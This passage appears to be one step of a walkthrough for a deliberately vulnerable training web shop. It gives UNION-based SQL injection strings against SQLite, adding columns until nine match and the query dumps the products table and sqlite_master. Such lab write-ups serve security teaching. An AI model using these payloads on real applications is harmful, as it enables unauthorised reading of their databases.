...
7. Start with ``` ')) UNION SELECT '1' FROM sqlite_master-- ``` then add colums e.g. ``` ')) UNION SELECT '1', '2' FROM sqlite_master-- ``` until the following query ``` ')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- ``` dumps the products table and an extra element ``` {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"} ``` from the `sqlite_master` table.
